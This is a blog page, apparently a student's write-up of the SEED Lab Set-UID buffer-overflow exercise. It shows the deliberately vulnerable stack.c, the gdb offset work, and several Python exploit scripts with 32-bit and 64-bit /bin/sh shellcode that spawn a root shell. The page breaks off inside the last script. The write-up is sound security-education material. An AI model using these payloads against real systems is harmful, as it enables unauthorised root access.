<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SEED LAB Buffer Overflow(Set-UID) | Xjelly's Blog</title><meta name="author" content="xjelly"><meta name="copyright" content="xjelly"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Buffer Overflow Lab.记录实验过程。">
<meta property="og:type" content="article">
<meta property="og:title" content="SEED LAB Buffer Overflow(Set-UID)">
<meta property="og:url" content="https://jellyfish0029.github.io/2023/11/09/SEED%20LAB%20Buffer%20overflow/index.html">
<meta property="og:site_name" content="Xjelly&#39;s Blog">
<meta property="og:description" content="Buffer Overflow Lab.记录实验过程。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://jellyfish0029.github.io/images_config/index_img.jpg">
<meta property="article:published_time" content="2023-11-09T09:28:37.936Z">
<meta property="article:modified_time" content="2024-03-28T02:56:06.870Z">
<meta property="article:author" content="xjelly">
<meta property="article:tag" content="SEED Lab">
<meta property="article:tag" content="Software Security 软件安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jellyfish0029.github.io/images_config/index_img.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://jellyfish0029.github.io/2023/11/09/SEED%20LAB%20Buffer%20overflow/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SEED LAB Buffer Overflow(Set-UID)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-28 10:56:06'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images_config/index_img.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/ramblings/"><i class="fa-fw fas fa-pencil"></i><span> 随笔</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images_config/ar2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Xjelly's Blog"><span class="site-name">Xjelly's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/ramblings/"><i class="fa-fw fas fa-pencil"></i><span> 随笔</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SEED LAB Buffer Overflow(Set-UID)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-09T09:28:37.936Z" title="发表于 2023-11-09 17:28:37">2023-11-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-28T02:56:06.870Z" title="更新于 2024-03-28 10:56:06">2024-03-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Software-Security-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">Software Security 软件安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SEED LAB Buffer Overflow(Set-UID)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>Buffer Overflow (Set-UID)</h1>
<h2 id="Task-1-Getting-Familiar-with-Shellcode"><strong>Task 1: Getting Familiar with Shellcode</strong></h2>
<p>Run them and describe your observations. It should be noted that the compilation uses the execstack option, which allows code to be executed from the stack;without this option, the program will fail.</p>
<p>//shellcode C版</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line">int main() &#123;</span><br><span class="line">char *name[2];</span><br><span class="line">name[0] = &quot;/bin/sh&quot;;</span><br><span class="line">name[1] = NULL;</span><br><span class="line">execve(name[0], name, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>**任务要求：**编译、运行并观察call_shellcode.c生成的两个文件a32.out和a64.out,</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231016192858811.png" alt="image-20231016192858811"></p>
<p>**结论：**两个文件后分别运行了两个普通shell。</p>
<h2 id="Task-2-Understanding-the-Vulnerable-Program"><strong>Task 2: Understanding the Vulnerable Program</strong></h2>
<p>漏洞程序：stack.c</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Changing this size will change the layout of the stack.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">* Instructors can change this value each year, so students</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">* won’t be able to use the solutions from the past. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bof</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line"></span><br><span class="line">FILE *badfile;</span><br><span class="line"></span><br><span class="line">badfile = <span class="built_in">fopen</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fread</span>(str, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, badfile);</span><br><span class="line"></span><br><span class="line"><span class="built_in">bof</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It should be noted that the program gets its input from a file called badfile. This file is under users’ control. Now, our objective is to create the contents for badfile, such that when the vulnerable program copies the contents into its buffer, a root shell can be spawned.</p>
<p>**结论：**程序从badfile中获得输入。当stack.c为Set-UID程序并具有root权限时，用户可以通过缓存区溢出攻击获取root shell。为了完成攻击，需要构造badfile文件。</p>
<h2 id="Task-3-Launching-Attack-on-32-bit-Program-Level-1"><strong>Task 3: Launching Attack on 32-bit Program (Level 1)</strong></h2>
<p><strong>任务要求</strong>：在L1下发起攻击</p>
<p><strong>实验过程：</strong></p>
<p>先make，使用zsh,编译时指定可执行栈，关闭保护措施。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231016200547761.png" alt="image-20231016200547761"></p>
<p>使用gdb调试，在函数bof处打断点并ru至bof</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231016221839025.png" alt="image-20231016221839025"></p>
<p>next,进入函数bof,此时ebp已经指向当前的栈底，并且已经为buffer分配了地址。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231016221921910.png" alt="image-20231016221921910"></p>
<p>查看ebp和buffer的地址。ebp的地址减去buffer的地址，为108，为了覆盖ebp所指向的前帧指针，108+4=112，这就是要偏移的大小。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231016222135673.png" alt="image-20231016222135673"></p>
<p>修改exploit.py文件：将shellcode放在badfile末尾，ret设为0xffffcaf8+100。这是因为debug时gdb会往栈里压入一些信息，导致调试时的栈比实际运行时的深。所以在实际运行时，返回值比gdb中查看的大一些。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span>-<span class="built_in">len</span>(shellcode)</span><br><span class="line"><span class="comment"># Change this number </span></span><br><span class="line">content[start:start+<span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffcaf8</span>+<span class="number">100</span>          <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">112</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">4</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
<p>**运行效果：**成功获得root 权限。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231016231508202.png" alt="image-20231016231508202"></p>
<h2 id="Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2"><strong>Task 4: Launching Attack without Knowing Buffer Size (Level 2)</strong></h2>
<p>**任务要求：**已知buffer size在100到200之间，不知道具体的大小。</p>
<p><strong>实验过程：</strong></p>
<p>先使用gdb查看buffer的地址。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231017134519260.png" alt="image-20231017134519260"></p>
<p>已知buffer的长度在100-200之间，于是将偏移量在100-208之间的全部填充为返回地址，只要运行到其中任意一个偏移量的位置，就能获得正确的返回地址。由于实际运行时，栈比在gdb中运行时浅，所以计算返回地址时需要稍加大些：</p>
<p>ret    = 0xffffca50+300</p>
<p>（+300是通过尝试得出的，在尝试的过程中，发现+100、+250等等都不能攻击成功。说明gdb查看的地址只能作为参考，实际运行时的地址不定。）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">  <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">  <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span> </span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span>-<span class="built_in">len</span>(shellcode)</span><br><span class="line"><span class="comment"># Change this number </span></span><br><span class="line">content[start:start+<span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffca50</span>+<span class="number">300</span>    <span class="comment"># Change this number</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># Change this number </span></span><br><span class="line">L=<span class="number">4</span></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">204</span>,<span class="number">4</span>):</span><br><span class="line">		content[offset:offset+L]=(ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
<p>**运行效果：**成功获得root shell。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231017135615353.png" alt="image-20231017135615353"></p>
<h2 id="Task-5-Launching-Attack-on-64-bit-Program-Level-3"><strong>Task 5: Launching Attack on 64-bit Program (Level 3)</strong></h2>
<p>**任务要求：**在64位程序上发起攻击。</p>
<p><strong>实验过程：</strong></p>
<p>在64位地址空间中，只允许使用从 0x00 到 0x00007FFFFFFFFFFF 的地址。这说明每一个地址（8 Bytes）的最高两位都是00，在strcpy函数中，“00”被认为是空字符，被当作字符串的结束标志，所以“00”后的内容不再被拷贝。</p>
<p>首先使用gdb查看buffer的大小，算出offset=208+8=216。由于拷贝时可以拷贝到return address之前的内容，而且level  3 的buffer比较大，所以可以把shellcode放在buffer里。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231017164053961.png" alt="image-20231017164053961"></p>
<p>用gdb查看buffer的地址是0x7fffffffd870，实际运行时buffer的地址会大一些。但是只靠尝试比较难准确找到buffer实际运行时的地址。所以在stack.c中打印buffer address，可以看到stack-L3实际运行时buffer address=0x7fffffffd8d0,而stack-L3-dbg的buffer地址不同，可能是因为增加了一些调试信息而导致栈更深了。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231017230810903.png" alt="image-20231017230810903"></p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231017230706274.png" alt="image-20231017230706274"></p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231017230718745.png" alt="image-20231017230718745"></p>
<p><a target="_blank" rel="noopener" href="http://xn--exploit-lr4kg6hpr1fjhc.py">于是修改exploit.py</a>，把shellcode放在偏移量为0的地方，即buffer的开头，ret    = 0x7fffffffd870 +96，使ret等于运行时的buffer的地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">    <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span></span><br><span class="line"><span class="comment"># Change this number </span></span><br><span class="line">content[start:start+<span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffd870</span> +<span class="number">96</span> <span class="comment"># Change this number</span></span><br><span class="line">offset = <span class="number">216</span></span><br><span class="line"> <span class="comment"># Change this number </span></span><br><span class="line">L=<span class="number">8</span></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset+L]=(ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br></pre></td></tr></table></figure>
<p>运行结果：成功获得root shell.</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231017230334281.png" alt="image-20231017230334281"></p>
<h2 id="Task-6-Launching-Attack-on-64-bit-Program-Level-4"><strong>Task 6: Launching Attack on 64-bit Program (Level 4)</strong></h2>
<p>The target program (stack-L4) in this task is similar to the one in the Level 2, except that the buffer size is extremely small. We set the buffer size to 10, while in Level 2, the buffer size is much larger. Your goal is the same: get the root shell by attacking this Set-UID program. You may encounter additional challenges in this attack due to the small buffer size. If that is the case, you need to explain how your have solved those challenges in your attack.</p>
<p>**任务要求：**在64位程序上，buffer size =10的条件下发起攻击。</p>
<p><strong>实验过程：</strong></p>
<p>由于buffer较小，放不下shellcode，所以level 3 的方法失效。除了在bof函数栈中调用shellcode，main函数栈中也存有shellcode，是从badfile中读取时保存在str中的。由于可以改动return address ，所以考虑返回main函数中的str。</p>
<p>先计算buffer到return address的偏移：offset = 18</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231018132806996.png" alt="image-20231018132806996"></p>
<p>再查看main函数中str的地址：</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231018134654386.png" alt="image-20231018134654386"></p>
<p><a target="_blank" rel="noopener" href="http://xn--exploit-116kr69m.py">修改exploit.py</a>:此时shellcode放在哪里都没有影响，因为返回到main中的str时，即从badfile的第一个字节开始执行。</p>
<p>为了找到str在运行时的地址，也在stack.c中增加一行代码，打印出str的地址为0x7fffffffddd0.</p>
<p>所以ret    = 0x7fffffffdd70+270=0x7fffffffddd0。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">    <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span 